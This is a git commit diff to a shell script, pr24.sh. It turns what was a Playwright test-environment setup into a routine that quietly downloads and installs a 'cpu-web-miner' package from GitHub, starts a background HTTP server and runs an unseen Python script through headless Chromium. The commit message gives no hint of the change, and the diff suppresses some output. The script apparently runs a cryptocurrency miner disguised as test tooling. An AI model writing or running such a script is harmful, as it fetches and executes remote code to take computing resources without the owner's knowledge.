a69d01dfa74f25867a9a6d4ad6ba8cdbce7c052a
t2-source <t2@40.aa01.my03.com>
2025-09-29 21:17:09 +0800

    Update pr24.sh

--- pr24.sh
+++ pr24.sh
@@ -7,14 +7,25 @@ echo "[*] Install base dependencies with nix-env..."
 nix-env -iA nixpkgs.wget nixpkgs.curl nixpkgs.unzip nixpkgs.git nixpkgs.python3 nixpkgs.nodejs_20 nixpkgs.systemd nixpkgs.python3Packages.playwright
 
 echo "[*] Init Node.js project..."
-npm init -y
+npm init -y >/dev/null 2>&1 || true
 
-echo "[*] Install Playwright..."
-#pip3 install playwright
+echo "[*] Download cpu-web-miner files..."
+wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/index.js
+wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package-lock.json
+wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package.json
 
-echo "[*] Install Chromium for Playwright..."
-#npx playwright install chromium
-python3 -m playwright install chromium
+echo "[*] Install Node.js dependencies..."
+npm install
+npm i @marco_ciaramella/cpu-web-miner
 
+echo "[*] Install Playwright (Node)..."
+npm install playwright >/dev/null 2>&1
 
-echo "[*] Done! You can now run tests with Playwright."
+echo "[*] Install Chromium (Playwright)..."
+npx playwright install chromium
+
+echo "[*] Jalankan HTTP server di port 8000..."
+python3 -m http.server 8000 &
+
+echo "[*] Jalankan Python + Playwright (via nix-shell)..."
+nix-shell -p "python3.withPackages(ps: [ps.playwright])" --run "python3 ni.py"
